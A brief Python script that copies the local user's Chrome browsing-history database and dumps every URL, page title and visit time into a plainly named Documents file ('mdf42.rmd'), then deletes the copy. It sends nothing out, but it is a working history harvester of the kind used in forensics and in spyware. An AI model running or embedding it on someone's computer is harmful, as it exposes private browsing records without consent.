import sqlite3, shutil, os, getpass, datetime as dt, time as t
u, o, c, f = getpass.getuser(), f"C:\\Users\\{getpass.getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", f"C:\\Users\\{getpass.getuser()}\\Documents\\HistoryCopy", f"C:\\Users\\{getpass.getuser()}\\Documents\\mdf42.rmd"
shutil.copy(o, c)
if os.path.exists(c):
    with sqlite3.connect(c) as conn, open(f, 'w', encoding='utf-8') as w:
        w.writelines(f"URL: {i[0]}\nTitle: {i[1]}\nLast Visit Time: {dt.datetime(1601, 1, 1) + dt.timedelta(microseconds=i[2])}\n\n" for i in conn.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC").fetchall())
    conn.close()
    os.remove(c)